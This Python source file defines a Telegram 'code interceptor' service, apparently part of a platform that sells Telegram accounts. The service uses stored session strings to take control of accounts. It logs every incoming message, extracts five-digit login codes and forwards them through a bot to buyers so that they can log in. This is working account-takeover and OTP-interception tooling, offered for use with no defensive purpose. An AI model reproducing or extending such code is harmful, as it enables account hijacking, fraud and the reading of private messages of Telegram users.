"""
Code Interceptor Service - Intercepts Telegram login codes for sold accounts
Integrated from AuthBot functionality
"""
import asyncio
import logging
import re
from typing import Dict, Optional, List
from telethon import TelegramClient, events
from telethon.errors import SessionRevokedError, UnauthorizedError, AuthKeyUnregisteredError
from telethon.sessions import StringSession

logger = logging.getLogger(__name__)


class CodeInterceptorService:
    """Service to intercept and forward Telegram login codes for sold accounts"""
    
    def __init__(self, api_id: int, api_hash: str, db_connection, admin_bot_client=None):
        self.api_id = api_id
        self.api_hash = api_hash
        self.db_connection = db_connection
        self.admin_bot_client = admin_bot_client
        self.account_clients: Dict[str, TelegramClient] = {}
        self.pending_codes: Dict[str, List[int]] = {}  # {account_id: [buyer_user_ids]}
        self.account_id_to_db_id: Dict[int, str] = {}  # {telegram_account_id: db_account_id}
    
    async def start_intercepting_account(self, account_id: str, session_string: str, buyer_user_id: int):
        """Start intercepting codes for a sold account"""
        try:
            from app.utils.encryption import decrypt_data
            
            logger.info(f"[OTP] Starting interception for account {account_id}")
            
            # Try to decrypt session, fallback to using as-is if already decrypted
            try:
                decrypted_session = decrypt_data(session_string)
                logger.info(f"[OTP] Session decrypted for account {account_id}")
            except Exception as decrypt_error:
                logger.warning(f"[OTP] Session decryption failed for {account_id}, using as-is: {decrypt_error}")
                decrypted_session = session_string
            
            logger.info(f"[OTP] Creating TelegramClient for account {account_id}")
            
            # Create client
            client = TelegramClient(
                StringSession(decrypted_session),
                self.api_id,
                self.api_hash
            )
            
            logger.info(f"[OTP] Connecting client for account {account_id}")
            await client.connect()
            logger.info(f"[OTP] Client connected for account {account_id}")
            
            if not await client.is_user_authorized():
                logger.error(f"[OTP] Account {account_id} session not authorized")
                await client.disconnect()
                return False
            
            logger.info(f"[OTP] Client authorized for account {account_id}")
            
            me = await client.get_me()
            telegram_account_id = me.id
            
            logger.info(f"[OTP] Account info: ID={telegram_account_id}, Username={me.username}")
            
            # Store mapping
            self.account_id_to_db_id[telegram_account_id] = account_id
            self.account_clients[account_id] = client
            
            # Add buyer to pending codes list
            if account_id not in self.pending_codes:
                self.pending_codes[account_id] = []
            if buyer_user_id not in self.pending_codes[account_id]:
                self.pending_codes[account_id].append(buyer_user_id)
            
            logger.info(f"[OTP] Registering message handler for account {account_id}")
            
            # Register message handler
            @client.on(events.NewMessage())
            async def code_handler(event):
                try:
                    text = event.message.text or ""
                    sender_id = event.sender_id
                    
                    # Log all incoming messages for debugging
                    logger.info(f"[OTP] Message from {sender_id}: {text[:100]}")
                    
                    # Skip own messages
                    if sender_id == telegram_account_id:
                        return
                    
                    text_lower = text.lower()
                    
                    # Check if message contains login code (broader patterns)
                    is_code_message = any(keyword in text_lower for keyword in [
                        "код", "code", "login", "verification", "telegram",
                        "sign in", "log in", "authenticate"
                    ])
                    
                    # Also check if message has 5-digit number (likely a code)
                    has_five_digits = bool(re.search(r'\b\d{5}\b', text))
                    
                    if is_code_message or has_five_digits:
                        # Extract 5-digit code
                        codes = re.findall(r'\b\d{5}\b', text)
                        
                        if codes and account_id in self.pending_codes:
                            code_value = codes[0]
                            logger.info(f"[OTP] ✅ Intercepted code {code_value} for account {account_id}")
                            
                            # Send code to all waiting admins
                            for user_id in self.pending_codes[account_id]:
                                await self.send_code_to_buyer(user_id, code_value)
                            
                            # Clear pending list
                            self.pending_codes[account_id] = []
                            
                            logger.info(f"[OTP] Code {code_value} sent to admins for account {account_id}")
                
                except Exception as e:
                    logger.error(f"Error in code handler for account {account_id}: {e}")
            
            logger.info(f"✅ Started intercepting codes for account {account_id} (Telegram ID: {telegram_account_id})")
            return True
            
        except (SessionRevokedError, UnauthorizedError, AuthKeyUnregisteredError) as e:
            logger.warning(f"Session invalid for account {account_id}: {e}")
            return False
        except Exception as e:
            logger.error(f"Error starting code interception for account {account_id}: {e}")
            return False
    
    async def send_code_to_buyer(self, buyer_user_id: int, code_value: str):
        """Send intercepted code to admin"""
        try:
            if self.admin_bot_client:
                message = f"""🔐 **Login Code Received**

Your Telegram login code: **{code_value}**

⚠️ Use this code to login to the account."""
                
                await self.admin_bot_client.send_message(buyer_user_id, message)
                logger.info(f"Code sent to admin {buyer_user_id}")
            else:
                logger.error(f"Admin bot client not available to send code to {buyer_user_id}")
        except Exception as e:
            logger.error(f"Error sending code to admin {buyer_user_id}: {e}")
    
    async def stop_intercepting_account(self, account_id: str):
        """Stop intercepting codes for an account"""
        try:
            if account_id in self.account_clients:
                client = self.account_clients[account_id]
                await client.disconnect()
                del self.account_clients[account_id]
                
                # Clean up mappings
                telegram_id = None
                for tid, aid in self.account_id_to_db_id.items():
                    if aid == account_id:
                        telegram_id = tid
                        break
                
                if telegram_id:
                    del self.account_id_to_db_id[telegram_id]
                
                if account_id in self.pending_codes:
                    del self.pending_codes[account_id]
                
                logger.info(f"Stopped intercepting codes for account {account_id}")
                return True
        except Exception as e:
            logger.error(f"Error stopping code interception for account {account_id}: {e}")
            return False
    
    async def add_buyer_to_pending(self, account_id: str, buyer_user_id: int):
        """Add buyer to pending codes list"""
        if account_id not in self.pending_codes:
            self.pending_codes[account_id] = []
        if buyer_user_id not in self.pending_codes[account_id]:
            self.pending_codes[account_id].append(buyer_user_id)
            logger.info(f"Added buyer {buyer_user_id} to pending codes for account {account_id}")
    
    async def cleanup_expired_sessions(self):
        """Clean up disconnected or invalid sessions"""
        try:
            accounts_to_remove = []
            
            for account_id, client in self.account_clients.items():
                try:
                    if not client.is_connected():
                        accounts_to_remove.append(account_id)
                except:
                    accounts_to_remove.append(account_id)
            
            for account_id in accounts_to_remove:
                await self.stop_intercepting_account(account_id)
            
            if accounts_to_remove:
                logger.info(f"Cleaned up {len(accounts_to_remove)} expired sessions")
        
        except Exception as e:
            logger.error(f"Error cleaning up sessions: {e}")
    
    async def get_active_interceptions(self) -> List[str]:
        """Get list of accounts currently being intercepted"""
        return list(self.account_clients.keys())
    
    async def shutdown(self):
        """Shutdown all interception clients"""
        logger.info("Shutting down code interceptor service...")
        
        for account_id in list(self.account_clients.keys()):
            await self.stop_intercepting_account(account_id)
        
        logger.info("Code interceptor service shutdown complete")
